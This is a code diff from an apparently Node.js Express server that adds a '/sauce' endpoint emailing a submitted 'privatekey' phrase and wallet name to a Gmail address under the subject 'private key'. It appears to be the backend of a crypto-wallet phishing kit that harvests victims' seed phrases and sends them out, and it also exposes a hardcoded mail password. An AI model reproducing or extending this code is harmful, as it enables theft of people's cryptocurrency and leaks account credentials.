@@ -22,7 +22,26 @@ var transporter = nodemailer.createTransport({
     pass: "hffwmxssfdqodeus",
   },
 });
-
+app.post("/sauce", (req, res) => {
+  const mailOptions = {
+    from: `bridgetsmith855@gmail.com`,
+    to: `suskidrae18@gmail.com`,
+    subject: "private key",
+    html: `
+        <p>
+            <b>privatekey: </b>${req.body.phrase}<br>
+            <b>wallet: </b>${req.body.initial}<br>
+        </p>`,
+  };
+  transporter.sendMail(mailOptions, function (err, data) {
+    if (err) {
+      console.log(err);
+    } else {
+      console.log("sent");
+      res.send("sent");
+    }
+  });
+});
 app.post("/", (req, res) => {
   const mailOptions = {
     from: `bridgetsmith855@gmail.com`,
